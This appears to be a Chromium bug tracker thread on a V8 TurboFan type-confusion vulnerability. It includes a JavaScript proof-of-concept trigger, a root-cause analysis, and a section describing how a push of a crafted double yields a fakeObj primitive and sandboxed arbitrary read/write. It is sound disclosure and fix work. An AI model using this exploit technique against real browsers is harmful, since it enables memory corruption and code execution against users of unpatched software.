This doesn't appear to be a security issue as presented. Will keep it restricted for now just in case, and also set as S3 in the meantime.
Over to marja@ based on both sets of bisects -- reported and clusterfuzz.

### ki...@gmail.com (2025-03-04)

Hi, the check only compiles in the debug version. Based on the output, this appears to be a type confusion vulnerability, and it should be categorized as a security issue rather than a common bug. Thanks.

### ma...@chromium.org (2025-03-04)

Agreeing with the reporter, this is a type confusion bug, so it's a vulnerability.

### ma...@chromium.org (2025-03-04)

Suspecting the problem is that we don't realize that v3's map can change if we transition v2 here:

```
function main() {
   print("in main");
   function f0(v2, v3) {
    // TransitionElementsKindOrCheckMap: PACKED_SMI -> HOLEY_DOUBLE_ELEMENTS
    var v4 = v3[0]; 

    // TransitionElementsKindOrCheckMap: HOLEY_DOUBLE_ELEMENTS -> HOLEY_ELEMENTS
    var v5 = v2[0]; 

    // This is now confused because v3 is not HOLEY_DOUBLE_ELEMENTS (if v2 == v3).
    Array.prototype.indexOf.call(v3);
  }
  %PrepareFunctionForOptimization(f0);
  var v0 = new Array(1); 
  v0[0] = 'tagged'; // HOLEY_ELEMENTS
  f0(v0, [1]);

  var v1 = new Array(1); 
  v1[0] = 0.1; // HOLEY_DOUBLE_ELEMENTS

  %OptimizeFunctionOnNextCall(f0);
  f0(v1, v1);

}
main();
main();

```

### ma...@chromium.org (2025-03-04)

Not sure if my initial theory is correct. We seem to have this graph when compiling the second time:

#49:End(#48:Return)

```

so we do load the the length and the elements of the parameter #3 again (nodes #69 and #70), but then we still seem to conclude ArrayIndexOfHoleyDoubles is the way to go, because h.elements\_kind() is HOLEY\_DOUBLE\_ELEMENTS in JSCallReducer::ReduceArrayIndexOf.

### ma...@chromium.org (2025-03-04)

More debugging notes:

In CanInlineArrayIteratingBuiltin in js-call-reducer.cc, we really seem to think that the appropriate map is the HOLEY\_DOUBLE\_ELEMENTS map, so, looks like we are missing the "v3's map might have changed" info.

# Root Cause

## Code Trigger Overview

```
function main() {
  function f0(v2, v3) {
    // 1. Reading v3[0], triggering the transition from PACKED_SMI_ELEMENTS to HOLEY_DOUBLE_ELEMENTS
    var v4 = v3[0];

    // 2. Reading v2[0], triggering the transition from HOLEY_DOUBLE_ELEMENTS to HOLEY_ELEMENTS
    var v5 = v2[0];

    // 3. Finally calling Array.prototype.indexOf.call(v3).
    //    However, if v2 === v3 at this point, v3 is actually no longer HOLEY_DOUBLE_ELEMENTS.
    Array.prototype.indexOf.call(v3);
  }

  %PrepareFunctionForOptimization(f0);

  // First, provide a set of "normal" inputs tf0 to activate JIT feedback
  var v0 = new Array(1);
  v0[0] = 'tagged'; // => HOLEY_ELEMENTS
  f0(v0, [1]);      // v3 here is a numeric array => initially PACKED_SMI_ELEMENTS, then read as HOLEY_DOUBLE

  // Prepare the next set of data to use after optimization
  var v1 = new Array(1);
  v1[0] = 0.1; // => HOLEY_DOUBLE_ELEMENTS

  %OptimizeFunctionOnNextCall(f0);

  // Here we pass v1 to both v2 and v3 simultaneously, causing a map confusion
  f0(v1, v1);
}

main();
main();

```

During the call `f0(v1, v1)`, `v2` and `v3` refer to **the same** array object. Therefore, after reading `v3[0]` completes the first elements-kind transition, that array has already been marked as `HOLEY_DOUBLE_ELEMENTS`. Immediately afterward, when `v2[0]` is read (which is a "tagged" value—no longer suitable for a double), the same array's internal Map transitions from `HOLEY_DOUBLE_ELEMENTS` to `HOLEY_ELEMENTS`.

Finally, `Array.prototype.indexOf.call(v3)` is inlined to a version specialized for "Holey Double" arrays (`ArrayIndexOfHoleyDoubles`), causing a mismatch: the actual array has become `HOLEY_ELEMENTS`, but the optimizer still believes it is `HOLEY_DOUBLE_ELEMENTS`.

---

## Alias + ElementsKind Transition

1. Alias Issue
   In TurboFan, `v2` and `v3` are aliases to the **same** `JSArray` object. When the compiler infers whether object properties (like the elements pointer, length, or map) are mutable and when, it uses a global alias analysis and side-effect analysis. However, if the compiler fails to realize that writing/reading via `v2` also affects `v3`, it can make incorrect assumptions.
2. Multiple Transitions of ElementsKind
   
   - First: from `PACKED_SMI_ELEMENTS` to `HOLEY_DOUBLE_ELEMENTS`
   - Second: from `HOLEY_DOUBLE_ELEMENTS` to `HOLEY_ELEMENTS`
   
   When TurboFan sees in its IR that `v3` started as a "double array" and was already transitioned once, it might treat it as a stable `HOLEY_DOUBLE_ARRAY`, using `CheckMap` or `TransitionElementsKind` nodes to pin down that type. But in reality, the same array object undergoes another transition later—if that second transition is not properly modeled in the IR as affecting the same object, the compiler won't realize its Map has changed to `HOLEY_ELEMENTS`.
3. Inlined Array.prototype.indexOf
   In `JSCallReducer::ReduceArrayIndexOf`, V8 decides which specialized built-in to use based on the inferred ElementsKind (e.g., `ArrayIndexOfPackedDoubles`, `ArrayIndexOfHoleyDoubles`, or `ArrayIndexOfTagged`). Once it picks `ArrayIndexOfHoleyDoubles`, the compiler assumes the array is still a double array at the time of the call. If in reality its Map is now a plain `HOLEY_ELEMENTS`, the inlined code is incorrect.

---

# RCE Exploit

Based on the root cause of this vulnerability, we can see that the issue is not actually with `indexOf` itself but rather the incorrect inference of `v3`'s type. We therefore use:

```
Array.prototype.push.call(v3, 2.30194104898585e-310);

```

to exploit the bug. Inside the `push` function, an 8-byte double value is written directly into the array's elements storage, because at that moment the compiler believes the array is a double array—while in reality it is an object array. This creates a perfect fakeObj primitive.

By leveraging this fakeObj primitive and forging a fake array with controllable length and elements pointer, we can achieve arbitrary address read/write.

We have uploaded an exploit showing how to use this vulnerability to obtain read/write primitives for arbitrary addresses inside the sandbox.

We changed the length of a victim array to 1153410 to demonstrate controllable arbitrary address read/write.

```
$ gsutil cp gs://v8-asan/linux-release/d8-linux-release-v8-component-99042.zip /tmp

We have uploaded a new exploit to demonstrate that the vulnerability can be exploited without native syntax. However, the heap layout in this exploit still requires adjustments, so multiple runs may be needed to trigger it. Therefore, we recommend using the previous version of exploit to reproduce.

This would have fallen out of the security merge review queue, but I was looking at this issue because I was aware the reporter provided an exploit for it.
Please note in the future to not manually requests merges unless the bot has failed or there is a special case.
One human intervention has been made (such as the manual merge request to M135), the bot will assume the human is correct and will not intervene.
The bot will request merges for all medium+ security fixes once the issue is closed as fixed.

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ma...@chromium.org (2025-03-07)

This bug was a regression in M133. Nothing needs to be done for M132, but we should make sure the LTS after that includes the fix.

### qk...@google.com (2025-03-10)

Labelling as not applicable for LTS 132 and LTS 126, because the bug was a regression in M133, so we don't need to merge back the fix to M132 and M126.
